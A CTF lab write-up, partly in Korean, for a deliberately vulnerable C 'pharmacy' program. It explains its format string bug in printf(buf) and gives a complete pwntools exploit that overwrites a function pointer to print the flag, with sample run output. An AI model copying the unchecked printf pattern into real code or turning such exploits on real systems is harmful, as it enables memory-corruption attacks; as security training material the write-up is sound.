https://github.com/hspace-io/Space_Alone/blob/main/problems/Chapter08/ch8.c
```
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

void open_emergency_medicine(){
	char buf[30];
	int fd = open("flag" , O_RDONLY);
	read(fd,buf,20);
	printf("%s\n",buf);
	close(fd);
}

void empty(){
	printf("There is no more medicine\n");
}
void exist(){
	printf("This medicine is located in the .fsb section.\n");
}

void init(){
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
}

void menu(){
	puts("1. search medicine");
	puts("2. take medicine");
	puts("3. quit");
	printf("> ");
}

int main(){
	init();
	int *exitst_or_not=(int *)exist;
	char buf[0x100];
	int num;
	puts("Welcome to BOF pharmacy");
	puts("What do you want?");
	while(1){
		menu();
		scanf("%d",&num);
		switch(num){
			case 1:
				memset(buf,0,0x100);
				read(0, buf, 0x9f);
				printf(buf);
				if(strstr(buf, "Painkiller") || strstr(buf, "Morphine") || strstr(buf, "ibuprofen")){
					exitst_or_not = (int *)empty;
				}
				break;
			case 2:
				if(exitst_or_not != NULL){
					(*(void (*)()) exitst_or_not)();
				}
				else{
					printf("Choose medicine first\n");
				}
				break;
			case 3:
				printf("Goodbye\n");
				return 0;
				break;
			default:
				printf("Wrong input\n");
				break;
		}
		
	}
	return 0;

	
}
```

```
[*] '/home/Awakening_in_the_Dark/fsb'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

코드에 아주아주아주아주아주아주 치명적인 버그가 있다.  
``printf(buf);``는 buf 안에 들어가는 값을 뭐든 출력하기 때문에, 이 안에 형식 지정자(also known as FORMAT STRING)를 넣어도 고대로 출력한다.  
따라서 Format String Bug가 발생하는 것을 확인할 수 있다.  

또한 문제의 ``open_emergency_medicine()`` 함수는 flag를 그대로 출력해주기 때문에, FSB를 사용하여 이 함수를 실행하게끔 유도하면 된다.  
아주 친절하게 main 함수의 2번 옵션은 exitst_or_not에 저장된 주소를 그대로 실행한다.  
따라서 FSB로 exitst_or_not에 ``open_emergency_medicine()`` 함수의 주소를 쓴 다음, 2번 옵션을 선택하면 문제를 해결할 수 있다.  

또한 exitst_or_not은 ``[buf-0x8]``에 위치해있으므로 buf 주소를 leak한 후 8을 빼서 구해주면 된다.

익스플로잇은 아래와 같다:
```
from pwn import *
context.arch = "amd64"

p = process('./fsb')
elf = ELF('./fsb')

#######################
### Helper Function ###
#######################

def fsb(payload):
    p.sendlineafter(b"> ", b'1')
    p.send(payload)

def execute():
    p.sendlineafter(b"> ", b'2')

####################
### Exploitation ###
####################

get_flag = elf.symbols['open_emergency_medicine']

fsb(b"%1$p")
buf_addr = int(p.recv(14), 16)
print(f"[+] buf_addr: {hex(buf_addr)}")

exitst_or_not = buf_addr - 0x8

payload = fmtstr_payload(8, {exitst_or_not:get_flag})
fsb(payload)

p.interactive()
```

위 익스플로잇을 실행하면 Chapter 9 유저의 PW를 획득할 수 있다.
```
[+] Starting local process './fsb': pid 5131
[+] buf_addr: 0x7ffc86e91650
[*] Switching to interactive mode
fsbeeee
0\x16\xe9\x86\xfc\x7f
1. search medicine
2. take medicine
3. quit
> $
```
